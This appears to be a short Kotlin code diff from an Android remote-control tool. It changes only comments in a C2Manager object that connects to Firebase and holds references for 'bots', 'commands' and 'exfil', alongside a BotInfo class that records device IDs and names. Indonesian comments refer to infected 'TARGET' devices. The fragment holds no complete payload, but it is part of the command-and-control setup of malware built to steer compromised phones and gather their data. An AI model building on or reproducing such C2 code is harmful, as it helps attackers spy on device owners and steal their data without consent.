@@ -5,7 +5,6 @@ import com.google.firebase.database.*
 import java.text.SimpleDateFormat
 import java.util.*
 
-// Data Classes
 data class BotInfo(
     val deviceId: String = "",
     val deviceName: String = "",
@@ -83,7 +82,7 @@ object C2Manager {
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
             // 🔥 FIX: HAPUS setPersistenceEnabled dari CONTROLLER
-            // Persistence cuma dipake di TARGET biar ga conflict
+            // Biar target aja yang pake, ga conflict
             botsRef = database.getReference(REF_BOTS)
             commandsRef = database.getReference(REF_COMMANDS)
             exfilRef = database.getReference(REF_EXFIL)
